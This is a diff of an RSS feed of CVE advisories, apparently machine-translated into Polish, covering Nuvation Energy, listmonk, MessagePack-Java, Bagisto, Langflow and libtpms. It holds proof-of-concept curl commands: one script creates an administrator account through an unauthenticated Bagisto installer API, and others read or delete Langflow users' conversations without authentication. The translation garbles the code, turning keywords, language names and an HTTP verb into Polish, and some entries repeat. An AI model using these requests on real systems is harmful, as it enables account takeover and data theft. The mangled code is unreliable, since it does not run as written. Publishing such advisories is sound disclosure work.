@@ -1,5 +1,5 @@
 <?xml version='1.0' encoding='utf-8'?>
-<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-21447</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21447</link><pubDate>Fri, 02 Jan 2026 22:50:47 +0000</pubDate><description>### Podsumowanie
+<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2025-64124</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-64124</link><pubDate>Sat, 03 Jan 2026 00:28:24 +0000</pubDate><description>Nieprawidłowa neutralizacja elementów specjalnych używanych w poleceniu systemu operacyjnego („Wstrzykiwanie poleceń systemu operacyjnego”). Luka w kontrolerze Nuvation Energy Multi-Stack Controller (MSC) umożliwia wstrzykiwanie poleceń systemu operacyjnego. Ten problem dotyczy kontrolera Multi-Stack (MSC): przed wersją 2.5.1.</description></item><item><title>CVE-2025-64125</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-64125</link><pubDate>Sat, 03 Jan 2026 00:21:20 +0000</pubDate><description>Luka w usłudze Nuvation Energy nCloud VPN umożliwiała mostkowanie granic sieci. Ten problem dotyczył usługi nCloud VPN i został naprawiony 12.12.2025 r. (grudzień 2025 r.).Użytkownicy końcowi nie muszą podejmować żadnych działań, aby złagodzić problem.</description></item><item><title>CVE-2026-21447</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21447</link><pubDate>Fri, 02 Jan 2026 22:50:47 +0000</pubDate><description>### Podsumowanie
 
 Luka w zabezpieczeniach związana z niebezpiecznym odwołaniem do obiektu bezpośredniego w funkcji ponownego zamawiania zamówienia klienta umożliwia każdemu uwierzytelnionemu klientowi dodawanie artykułów z zamówienia innego klienta do własnego koszyka poprzez manipulację parametrem identyfikatora zamówienia.Ujawnia to poufne informacje o zakupie i umożliwia potencjalne oszustwo.
 
@@ -58,7 +58,207 @@ SSTI, gdy zwykły klient zamawia dowolny produkt w kroku dodawania adresu, może
 
 
 ### Wpływ
-- Może prowadzić do RCE</description></item><item><title>CVE-2025-64123</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-64123</link><pubDate>Fri, 02 Jan 2026 21:41:25 +0000</pubDate><description>Luka w usłudze Nuvation Energy nCloud VPN umożliwiała mostkowanie granic sieci. Ten problem dotyczył usługi nCloud VPN i został naprawiony 12.12.2025 r. (grudzień 2025 r.).Użytkownicy końcowi nie muszą podejmować żadnych działań, aby złagodzić problem.</description></item><item><title>CVE-2025-64122</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-64122</link><pubDate>Fri, 02 Jan 2026 21:39:26 +0000</pubDate><description>Luka w zabezpieczeniach niedostatecznie chronionych poświadczeń w kontrolerze wielostosowym Nuvation Energy (MSC) umożliwia fałszowanie podpisu w wyniku kradzieży klucza. Ten problem dotyczy kontrolera wielostosowego (MSC): do wersji 2.5.1.</description></item><item><title>CVE-2025-64121</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-64121</link><pubDate>Fri, 02 Jan 2026 21:35:53 +0000</pubDate><description>Ominięcie uwierzytelniania przy użyciu alternatywnej ścieżki lub kanału Luka w kontrolerze Nuvation Energy Multi-Stack Controller (MSC) umożliwia obejście uwierzytelnienia. Ten problem dotyczy kontrolera Multi-Stack (MSC): od wersji 2.3.8 do wersji 2.5.1.</description></item><item><title>CVE-2025-64120</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-64120</link><pubDate>Fri, 02 Jan 2026 21:33:23 +0000</pubDate><description>Nieprawidłowa neutralizacja elementów specjalnych używanych w poleceniu systemu operacyjnego („Wstrzykiwanie poleceń systemu operacyjnego”). Luka w kontrolerze Nuvation Energy Multi-Stack Controller (MSC) umożliwia wstrzykiwanie poleceń systemu operacyjnego. Ten problem dotyczy kontrolera Multi-Stack (MSC): od wersji 2.3.8 do wersji 2.5.1.</description></item><item><title>CVE-2025-64119</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-64119</link><pubDate>Fri, 02 Jan 2026 21:26:57 +0000</pubDate><description>Luka w systemie zarządzania baterią Nuvation umożliwia obejście uwierzytelniania. Ten problem dotyczy systemu zarządzania baterią: do wersji 2.3.9.</description></item><item><title>CVE-2026-21483</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21483</link><pubDate>Fri, 02 Jan 2026 20:57:29 +0000</pubDate><description>listmonk to samodzielny, hostowany samodzielnie menedżer biuletynów i list mailingowych.Przed wersją 6.0.0 użytkownik o niższych uprawnieniach z uprawnieniami do zarządzania kampaniami może wstrzyknąć złośliwy kod JavaScript do kampanii lub szablonów.Kiedy użytkownik z wyższymi uprawnieniami (superadministrator) przegląda lub wyświetla podgląd tej zawartości, XSS wykonuje się w kontekście jego przeglądarki, umożliwiając atakującemu wykonanie uprzywilejowanych działań, takich jak utworzenie kont administratora backdoora.Atak można przeprowadzić za pomocą funkcji archiwum publicznego, w przypadku której ofiary muszą po prostu odwiedzić łącze – nie jest wymagane kliknięcie podglądu.Wersja 6.0.0 rozwiązuje ten problem.</description></item><item><title>CVE-2026-21452</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21452</link><pubDate>Fri, 02 Jan 2026 20:47:44 +0000</pubDate><description>MessagePack dla języka Java to implementacja serializatora dla języka Java.W wersjach wcześniejszych niż 0.9.11 występuje luka w zabezpieczeniach umożliwiająca odmowę usługi podczas deserializacji plików .msgpack zawierających obiekty EXT32 o długości ładunku kontrolowanej przez osobę atakującą.Chociaż MessagePack-Java leniwie analizuje nagłówki rozszerzeń, później podczas materializowania danych rozszerzenia ufa zadeklarowanej długości ładunku EXT.Po wywołaniu metody ExtensionValue.getData() biblioteka próbuje przydzielić tablicę bajtów o zadeklarowanej długości bez wymuszania górnej granicy.Złośliwy plik .msgpack składający się tylko z kilku bajtów może zatem wywołać nieograniczoną alokację sterty, co skutkuje wyczerpaniem sterty maszyny JVM, zakończeniem procesu lub niedostępnością usługi.Luka ta jest wyzwalana podczas ładowania/deserializacji modelu, co sprawia, że ​​jest to luka w formacie modelu nadająca się do zdalnego wykorzystania.Luka umożliwia zdalny atak typu „odmowa usługi” na aplikacje, które deserializują pliki modelu niezaufanego .msgpack przy użyciu programu MessagePack for Java.Specjalnie spreparowany, ale poprawny składniowo plik .msgpack, zawierający obiekt EXT32 z kontrolowaną przez osobę atakującą, nadmiernie dużą długością ładunku, może wyzwolić nieograniczoną alokację pamięci podczas deserializacji.Po załadowaniu pliku modelu biblioteka ufa metadanym o zadeklarowanej długości i próbuje przydzielić tablicę bajtów o tym rozmiarze, co prowadzi do szybkiego wyczerpania sterty, nadmiernego wyrzucania elementów bezużytecznych lub natychmiastowego zakończenia maszyny JVM z błędem OutOfMemoryError.Atak nie wymaga zniekształconych bajtów, interakcji użytkownika ani podwyższonych uprawnień i można go wykorzystać zdalnie w rzeczywistych środowiskach, takich jak rejestry modeli, usługi wnioskowania, potoki CI/CD i oparte na chmurze platformy hostingu modeli, które akceptują lub pobierają artefakty .msgpack.Ponieważ złośliwy plik jest niezwykle mały, ale ważny, może ominąć podstawowe mechanizmy sprawdzania poprawności i skanowania, co skutkuje całkowitą niedostępnością usług i potencjalnymi awariami kaskadowymi w systemach produkcyjnych.Wersja 0.9.11 naprawia lukę.
+- Może prowadzić do RCE</description></item><item><title>CVE-2025-64123</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-64123</link><pubDate>Fri, 02 Jan 2026 21:41:25 +0000</pubDate><description>Luka w usłudze Nuvation Energy nCloud VPN umożliwiała mostkowanie granic sieci. Ten problem dotyczył usługi nCloud VPN i został naprawiony 12.12.2025 r. (grudzień 2025 r.).Użytkownicy końcowi nie muszą podejmować żadnych działań, aby złagodzić problem.</description></item><item><title>CVE-2025-64122</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-64122</link><pubDate>Fri, 02 Jan 2026 21:39:26 +0000</pubDate><description>Luka w zabezpieczeniach niedostatecznie chronionych poświadczeń w kontrolerze wielostosowym Nuvation Energy (MSC) umożliwia fałszowanie podpisu w wyniku kradzieży klucza. Ten problem dotyczy kontrolera wielostosowego (MSC): do wersji 2.5.1.</description></item><item><title>CVE-2025-64121</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-64121</link><pubDate>Fri, 02 Jan 2026 21:35:53 +0000</pubDate><description>Ominięcie uwierzytelniania przy użyciu alternatywnej ścieżki lub kanału Luka w kontrolerze Nuvation Energy Multi-Stack Controller (MSC) umożliwia obejście uwierzytelnienia. Ten problem dotyczy kontrolera Multi-Stack (MSC): od wersji 2.3.8 do wersji 2.5.1.</description></item><item><title>CVE-2025-64120</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-64120</link><pubDate>Fri, 02 Jan 2026 21:33:23 +0000</pubDate><description>Nieprawidłowa neutralizacja elementów specjalnych używanych w poleceniu systemu operacyjnego („Wstrzykiwanie poleceń systemu operacyjnego”). Luka w kontrolerze Nuvation Energy Multi-Stack Controller (MSC) umożliwia wstrzykiwanie poleceń systemu operacyjnego. Ten problem dotyczy kontrolera Multi-Stack (MSC): od wersji 2.3.8 do wersji 2.5.1.</description></item><item><title>CVE-2025-64119</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-64119</link><pubDate>Fri, 02 Jan 2026 21:26:57 +0000</pubDate><description>Luka w systemie zarządzania baterią Nuvation umożliwia obejście uwierzytelniania. Ten problem dotyczy systemu zarządzania baterią: do wersji 2.3.9.</description></item><item><title>CVE-2026-21446</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21446</link><pubDate>Fri, 02 Jan 2026 21:14:06 +0000</pubDate><description>### Kod luki
+
+**Plik:** `packages/Ibkul/Installer/src/Routes/Ib.php`
+
+```
+&lt;?php
+
+użyj Illuminate\\Session\\Middleware\\StartSession;
+użyj opcji Illuminate\\Support\\Facades\\Route;
+użyj Ibkul\\Installer\\Http\\Controllers\\InstallerController;
+
+Route::middleware(\['Ib', 'installer\_locale'\])-\&gt;group(function () {
+Route::controller(InstallerController::class)-\&gt;group(function () {
+Route::get('install', 'index')-\&gt;name('installer.index');
+
+Route::middleware(StartSession::class)-\&gt;prefix('install/api')-\&gt;group(function () {
+Route::post('env-file-setup', 'envFileSetup')-\&gt;name('installer.env\_file\_setup');
+Route::post('run-migration', 'runMigration')-\&gt;name('installer.run\_migration')-\&gt;withoutMiddleware('Ib');
+Route::post('run-seeder', 'runSeeder')-\&gt;name('installer.run\_seeder')-\&gt;withoutMiddleware('Ib');
+Route::get('download-sample', 'downloadSample')-\&gt;name('installer.download\_sample')-\&gt;withoutMiddleware('Ib');
+Route::post('admin-config-setup', 'adminConfigSetup')-\&gt;name('installer.admin\_config\_setup')-\&gt;withoutMiddleware('Ib');
+Route::post('sample-products-setup', 'createSampleProducts')-\&gt;name('installer.sample\_products\_setup')-\&gt;withoutMiddleware('Ib');
+});
+});
+});
+```
+
+Trasy API pozostają aktywne nawet po zakończeniu wstępnej instalacji, umożliwiając każdemu nieuwierzytelnionemu atakującemu:
+
+- Utwórz konta administratora
+- Zmodyfikuj konfigurację aplikacji
+- Potencjalnie zastąpić istniejące dane
+
+podstawowe **punkty końcowe API** (`/install/api/*`) są bezpośrednio dostępne i można je wykorzystywać bez żadnego uwierzytelniania.Osoba atakująca może całkowicie ominąć instalator Ib, wywołując bezpośrednio punkty końcowe API.
+
+### Jak reprodukować
+
+1. Interfejs instalatora Ib pod adresem `http://localhost:8000/install` ma zabezpieczenia po stronie klienta
+2. **Jednakże punkty końcowe API można bezpośrednio wykorzystać:**
+- Atak polega na wywołaniu `/install/api/admin-config-setup` bezpośrednio przez klienta curl/HTTP
+- Nie jest wymagany token CSRF, sesja ani uwierzytelnianie
+- Przepływ pracy Ib UI został całkowicie pominięty
+
+### Dowód koncepcji
+
+```
+#!/bin/bash
+# PoC: Utwórz konto administratora bez uwierzytelniania
+
+
+TARGET="http://localhost:8000"
+
+
+# Utwórz nowe konto administratora
+curl -X POST "$TARGET/install/api/admin-config-setup" \
+-H "Typ zawartości: aplikacja/json" \
+-d '{
+"admin_name": "Atakujący",
+"admin_email": "atak@evil.com",
+"admin_password": "HackedPassword123"
+}'
+
+
+echo „”
+echo "Utworzono nowe konto administratora!"
+echo "Zaloguj się pod adresem: $TARGET/admin"
+echo "E-mail: atakujący@evil.com"
+```
+
+### Oczekiwany wynik
+
+API powinno odrzucać nieuwierzytelnione żądania o statusie 401/403.
+
+### Rzeczywisty wynik
+
+API akceptuje żądanie i tworzy nowe konto administratora, umożliwiając pełny dostęp administracyjny do platformy e-commerce.
+
+### Zalecana poprawka
+
+Dodaj kontrolę zakończenia instalacji
+
+```
+// W InstallerController.php lub nowym oprogramowaniu pośrednim
+
+
+funkcja publiczna __construct()
+{
+// Sprawdź, czy aplikacja jest już zainstalowana
+if (plik_istnieje(ścieżka_podstawowa('.env')) &amp;&amp;
+config('klucz aplikacji') &amp;&amp;
+\Schema::hasTable('administratorzy') &amp;&amp;
+\DB::table('administratorzy')-&gt;count() &gt; 0) {
+abort(404, 'Aplikacja już zainstalowana');
+}
+}
+```</description></item><item><title>CVE-2026-21445</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21445</link><pubDate>Fri, 02 Jan 2026 21:11:50 +0000</pubDate><description>### Podsumowanie
+W wielu krytycznych punktach końcowych API w Langflow brakuje kontroli uwierzytelniania, co pozwala każdemu nieuwierzytelnionemu użytkownikowi uzyskać dostęp do poufnych danych konwersacji użytkowników, historii transakcji i wykonywać destrukcyjne operacje, w tym usuwanie wiadomości.Ma to wpływ na punkty końcowe obsługujące dane osobowe i operacje systemowe, które powinny wymagać odpowiedniej autoryzacji.
+
+### Szczegóły
+Luka występuje w trzech punktach końcowych interfejsu API w obrębie `src/backend/base/langflow/api/v1/monitor.py`, w których brakuje wymaganej zależności uwierzytelniania `dependentlies=[Depends(get_current_active_user)]`:
+
+**Dotknięte punkty końcowe:**
+
+1. **GET `/api/v1/monitor/messages`** (Linia 61)
+```pyton
+@router.get("/messages") # ❌ Brak uwierzytelnienia
+async def get_messages(
+sesja: DbSession,
+flow_id: Z adnotacją [UUID |Brak, Zapytanie()] = Brak,
+session_id: Z adnotacją [str |Brak, Zapytanie()] = Brak,
+# ...inne parametry
+) -&gt; lista[Odpowiedź na wiadomość]:
+```
+
+2. **GET `/api/v1/monitor/transactions`** (Linia 183)
+```pyton
+@router.get("/transactions") # ❌ Brak uwierzytelnienia
+async def get_transactions(
+flow_id: Adnotacja [UUID, Query()],
+sesja: DbSession,
+parametry: Adnotacja [Params |Brak, zależy (parametry niestandardowe)],
+) -&gt; Strona[Tabela Transakcji]:
+```
+
+3. **USUŃ `/api/v1/monitor/messages/session/{session_id}`** (wiersz 165)
+```pyton
+@router.delete("/messages/session/{session_id}", status_code=204) # ❌ Brak uwierzytelnienia
+async def usuń_wiadomości_sesja(
+identyfikator sesji: str,
+sesja: DbSession,
+):
+```
+
+**Dowody na niespójność:**
+Inne punkty końcowe w tym samym pliku prawidłowo implementują uwierzytelnianie:
+```pyton
+@router.get("/messages/sessions", zależności=[Depends(get_current_active_user)]) # ✅ Odpowiednio zabezpieczone
+@router.delete("/messages", status_code=204, zależności=[Depends(get_current_active_user)]) # ✅ Odpowiednio zabezpieczone
+```
+
+### PoC
+Wykonaj kroki reprodukcji, aby wykazać lukę:
+
+**Wymagania:**
+1. Uruchom instancję serwera Langflow
+2. Upewnij się, że nie podano nagłówków uwierzytelniających ani kluczy API
+
+**Polecenia reprodukcji:**
+,,bicie
+# 1. Uzyskaj dostęp do wszystkich rozmów użytkowników bez uwierzytelniania
+curl http://localhost:7860/api/v1/monitor/messages
+
+# 2. Uzyskaj dostęp do historii transakcji bez uwierzytelniania
+curl „http://localhost:7860/api/v1/monitor/transactions?flow_id=00000000-0000-0000-0000-000000000000”
+
+# 3. Usuń wiadomości użytkownika według sesji bez uwierzytelniania
+curl -X USUŃ http://localhost:7860/api/v1/monitor/messages/session/00000000-0000-0000-0000-000000000000
+```
+
+**Oczekiwane a rzeczywiste zachowanie:**
+- **Oczekiwane:** Wszystkie żądania powinny zwrócić „401 Nieautoryzowane”.
+- **Rzeczywiste:** wszystkie żądania zwracają pomyślne odpowiedzi zawierające wrażliwe dane lub wykonują destrukcyjne operacje
+
+### Wpływ
+
+**Typ luki:** Zerwane uwierzytelnianie i autoryzacja (10 najlepszych OWASP – A01:2021)
+
+**Waga:** Wysoka
+
+**Kogo dotyczy problem:**
+- **Wszyscy użytkownicy Langflow**: Dane rozmów osobistych narażone na nieautoryzowany dostęp
+- **Administratorzy systemu**: Ujawniono dzienniki transakcji
+
+**Konkretne skutki:**
+1. **Naruszenie danych**: Nieautoryzowany dostęp do rozmów użytkowników zawierających potencjalnie wrażliwe dane osobowe
+2. **Naruszenie prywatności**: Historie transakcji i wzorce aktywności użytkowników ujawnione bez zgody
+3. **Niszczenie danych**: Złośliwi aktorzy mogą usuwać historie rozmów użytkowników bez autoryzacji
+4. **Ryzyko braku zgodności**: Potencjalne naruszenia przepisów o ochronie danych (RODO, CCPA itp.)
+5. **Inteligencja systemu**: osoby atakujące mogą zbierać informacje o wzorcach korzystania z systemu i zachowaniach użytkowników
+
+**Scenariusze ataku:**
+- Złośliwi użytkownicy uzyskujący dostęp do zastrzeżonych danych konwersacji
+- Złośliwi użytkownicy usuwający historie rozmów innych użytkowników
+- Automatyczne zbieranie wszystkich rozmów użytkowników w celu gromadzenia danych
+- Ataki rozpoznawcze mające na celu zrozumienie architektury systemu i wzorców użytkowania
+
+**Zalecana poprawka:**
+Dodaj zależności uwierzytelniania do wszystkich punktów końcowych, których to dotyczy:
+
+```pyton
+@router.get("/messages", zależności=[Zależy(get_current_active_user)])
+@router.get("/transactions", zależności=[Zależy(get_current_active_user)])
+@router.delete("/messages/session/{session_id}", zależności=[Zależy(get_current_active_user)])
+```
+
+**Środowisko:**
+- Wersja Langflow: bieżąca główna gałąź
+- Dotknięte komponenty: Punkty końcowe monitorowania API v1
+- System uwierzytelniania: Wstrzykiwanie zależności FastAPI za pomocą `get_current_active_user`
+
+&lt;img szerokość="1908" wysokość="1029" alt="25-090901" src="https://github.com/user-attachments/assets/44bd03b4-6ada-45b7-b81b-9cb83747172b" /&gt;</description></item><item><title>CVE-2026-21483</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21483</link><pubDate>Fri, 02 Jan 2026 20:57:29 +0000</pubDate><description>listmonk to samodzielny, hostowany samodzielnie menedżer biuletynów i list mailingowych.Przed wersją 6.0.0 użytkownik o niższych uprawnieniach z uprawnieniami do zarządzania kampaniami może wstrzyknąć złośliwy kod JavaScript do kampanii lub szablonów.Kiedy użytkownik z wyższymi uprawnieniami (superadministrator) przegląda lub wyświetla podgląd tej zawartości, XSS wykonuje się w kontekście jego przeglądarki, umożliwiając atakującemu wykonanie uprzywilejowanych działań, takich jak utworzenie kont administratora backdoora.Atak można przeprowadzić za pomocą funkcji archiwum publicznego, w przypadku której ofiary muszą po prostu odwiedzić łącze – nie jest wymagane kliknięcie podglądu.Wersja 6.0.0 rozwiązuje ten problem.</description></item><item><title>CVE-2026-21452</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21452</link><pubDate>Fri, 02 Jan 2026 20:47:44 +0000</pubDate><description>MessagePack dla języka Java to implementacja serializatora dla języka Java.W wersjach wcześniejszych niż 0.9.11 występuje luka w zabezpieczeniach umożliwiająca odmowę usługi podczas deserializacji plików .msgpack zawierających obiekty EXT32 o długości ładunku kontrolowanej przez osobę atakującą.Chociaż MessagePack-Java leniwie analizuje nagłówki rozszerzeń, później podczas materializowania danych rozszerzenia ufa zadeklarowanej długości ładunku EXT.Po wywołaniu metody ExtensionValue.getData() biblioteka próbuje przydzielić tablicę bajtów o zadeklarowanej długości bez wymuszania górnej granicy.Złośliwy plik .msgpack składający się tylko z kilku bajtów może zatem wywołać nieograniczoną alokację sterty, co skutkuje wyczerpaniem sterty maszyny JVM, zakończeniem procesu lub niedostępnością usługi.Luka ta jest wyzwalana podczas ładowania/deserializacji modelu, co sprawia, że ​​jest to luka w formacie modelu nadająca się do zdalnego wykorzystania.Luka umożliwia zdalny atak typu „odmowa usługi” na aplikacje, które deserializują pliki modelu niezaufanego .msgpack przy użyciu programu MessagePack for Java.Specjalnie spreparowany, ale poprawny składniowo plik .msgpack, zawierający obiekt EXT32 z kontrolowaną przez osobę atakującą, nadmiernie dużą długością ładunku, może wyzwolić nieograniczoną alokację pamięci podczas deserializacji.Po załadowaniu pliku modelu biblioteka ufa metadanym o zadeklarowanej długości i próbuje przydzielić tablicę bajtów o tym rozmiarze, co prowadzi do szybkiego wyczerpania sterty, nadmiernego wyrzucania elementów bezużytecznych lub natychmiastowego zakończenia maszyny JVM z błędem OutOfMemoryError.Atak nie wymaga zniekształconych bajtów, interakcji użytkownika ani podwyższonych uprawnień i można go wykorzystać zdalnie w rzeczywistych środowiskach, takich jak rejestry modeli, usługi wnioskowania, potoki CI/CD i oparte na chmurze platformy hostingu modeli, które akceptują lub pobierają artefakty .msgpack.Ponieważ złośliwy plik jest niezwykle mały, ale ważny, może ominąć podstawowe mechanizmy sprawdzania poprawności i skanowania, co skutkuje całkowitą niedostępnością usług i potencjalnymi awariami kaskadowymi w systemach produkcyjnych.Wersja 0.9.11 naprawia lukę.
 
 CVSS Score: 7.5 (high)</description></item><item><title>CVE-2026-21450</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21450</link><pubDate>Fri, 02 Jan 2026 20:38:48 +0000</pubDate><description>Bagisto to platforma eCommerce typu open source w formacie laravel.Wersje wcześniejsze niż 2.3.10 są podatne na wstrzykiwanie szablonów po stronie serwera za pomocą parametru typu, co może prowadzić do zdalnego wykonania kodu lub innego wykorzystania.Wersja 2.3.10 rozwiązuje ten problem.</description></item><item><title>CVE-2026-21451</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21451</link><pubDate>Fri, 02 Jan 2026 20:37:06 +0000</pubDate><description>Bagisto to platforma eCommerce typu open source w formacie laravel.W Bagisto przed wersją 2.3.10 w edytorze stron CMS występuje zapisana luka w zabezpieczeniach Cross-Site Scripting (XSS).Chociaż platforma zwykle próbuje oczyścić znaczniki `&lt;script&gt;`, filtrowanie można ominąć, manipulując surowym żądaniem HTTP POST przed przesłaniem.W rezultacie dowolny JavaScript może być przechowywany w treści CMS i uruchamiany przy każdym przeglądaniu lub edytowaniu strony.Naraża to administratorów na poważne ryzyko, w tym całkowite przejęcie konta, przejęcie zaplecza i wykonanie złośliwego skryptu.Wersja 2.3.10 rozwiązuje ten problem.</description></item><item><title>CVE-2026-21449</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21449</link><pubDate>Fri, 02 Jan 2026 20:35:21 +0000</pubDate><description>Bagisto to platforma eCommerce typu open source w formacie laravel.Wersje wcześniejsze niż 2.3.10 są podatne na wstrzykiwanie szablonów po stronie serwera za pomocą imienia i nazwiska od użytkownika o niskich uprawnieniach.Wersja 2.3.10 rozwiązuje ten problem.</description></item><item><title>CVE-2026-21444</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21444</link><pubDate>Fri, 02 Jan 2026 19:05:31 +0000</pubDate><description>Libtpms, biblioteka zapewniająca emulację programową modułu Trusted Platform Module, ma wadę w wersjach 0.10.0 i 0.10.1.Powszechnie stosowana integracja libtpms z OpenSSL 3.x zawierała lukę związaną ze zwracanym IV (wektorem inicjującym), gdy używane były pewne szyfry symetryczne.Zamiast zwracać ostatnią IV, zwracała początkową IV dzwoniącemu, osłabiając w ten sposób kolejne etapy szyfrowania i deszyfrowania.Największym zagrożeniem wynikającym z tej luki jest poufność danych.Wersja 0.10.2 rozwiązuje ten problem.Nie są dostępne żadne znane obejścia.
 
